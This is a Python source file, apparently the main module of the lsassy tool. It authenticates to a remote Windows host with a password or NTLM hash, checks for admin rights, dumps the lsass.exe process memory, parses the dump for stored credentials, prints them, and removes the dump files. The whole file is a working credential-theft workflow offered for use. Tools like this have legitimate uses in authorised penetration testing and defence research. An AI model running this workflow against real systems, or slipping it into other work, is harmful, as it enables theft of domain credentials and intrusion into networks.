#!/usr/bin/env python3
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from lsassy.dumper import Dumper
from lsassy.impacketconnection import ImpacketConnection
from lsassy.parser import Parser
from lsassy.logger import Logger
from lsassy.writer import Writer
from lsassy.utils import *


class Lsassy:
    def __init__(self, debug=False, quiet=False):
        self._log = Logger(is_debug=debug, is_quiet=quiet)
        self._conn = None
        self._dumper = None
        self._parser = None
        self._dumpfile = None
        self._credentials = None
        self._writer = None

    def connect(self, hostname, domain_name, username, password, hashes):
        self._conn = ImpacketConnection(hostname, domain_name, username, password, hashes)
        self._conn.set_logger(self._log)
        login_result = self._conn.login()
        if not login_result.success():
            return login_result

        self._log.success("Authenticated")
        return RetCode(ERROR_SUCCESS)

    def dump_lsass(self, options=Dumper.Options):
        is_admin = self._conn.isadmin()
        if not is_admin.success():
            self._conn.close()
            return is_admin

        self._dumper = Dumper(self._conn, options)
        dump_result = self._dumper.dump()
        if not dump_result.success():
            return dump_result
        self._dumpfile = self._dumper.getfile()

        self._log.success("Process lsass.exe has been dumped")
        return RetCode(ERROR_SUCCESS)

    def parse_lsass(self, options=Dumper.Options):
        self._parser = Parser(self._dumpfile, options)
        parse_result = self._parser.parse()
        if not parse_result.success():
            return parse_result

        self._credentials = self._parser.get_credentials()
        self._log.success("Process lsass.exe has been parsed")
        return RetCode(ERROR_SUCCESS)

    def write_credentials(self, options=Writer.Options):
        self._writer = Writer(self._credentials, self._log, options)
        write_result = self._writer.write()
        if not write_result.success():
            return write_result

        return RetCode(ERROR_SUCCESS)

    def clean(self):
        if self._parser:
            r = self._parser.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._dumper:
            r = self._dumper.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._conn:
            r = self._conn.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        self._log.success("Cleaning complete")

    def get_logger(self):
        return self._log


class Core:
    def __init__(self):
        self.dump_options = Dumper.Options
        self.parse_options = Parser.Options
        self.write_options = Writer.Options

        self.lsassy = None

    def set_options_from_args(self, args):
        self.dump_options.dumpname = args.dumpname
        self.dump_options.procdump_path = args.procdump
        self.dump_options.dumpert_path = args.dumpert
        self.dump_options.method = args.method
        self.dump_options.timeout = args.timeout

        self.parse_options.raw = args.raw

        if args.json:
            self.write_options.format = "json"
        elif args.grep:
            self.write_options.format = "grep"
        else:
            self.write_options.format = "pretty"

    def run(self):
        return_code = ERROR_UNDEFINED
        try:
            return_code = self._run()
        except KeyboardInterrupt as e:
            print("\nQuitting gracefully...")
            return_code = RetCode(ERROR_USER_INTERRUPTION)
        except Exception as e:
            return_code = RetCode(ERROR_UNDEFINED, e)
        finally:
            self.clean()
            lsassy_exit(self.lsassy.get_logger(), return_code)

    def _run(self):
        args = get_args()
        self.set_options_from_args(args)

        self.lsassy = Lsassy(args.debug, args.quiet)
        """
        Extract hashes from arguments
        """

        r = self.lsassy.connect(args.target, args.domain, args.username, args.password, args.hashes)
        if not r.success():
            return r
        r = self.lsassy.dump_lsass(self.dump_options)
        if not r.success():
            return r
        r = self.lsassy.parse_lsass(self.parse_options)
        if not r.success():
            return r
        r = self.lsassy.write_credentials(self.write_options)
        if not r.success():
            return r
        return RetCode(ERROR_SUCCESS)

    def clean(self):
        if self.lsassy:
            self.lsassy.clean()


def run():
    Core().run()


if __name__ == '__main__':
    run()
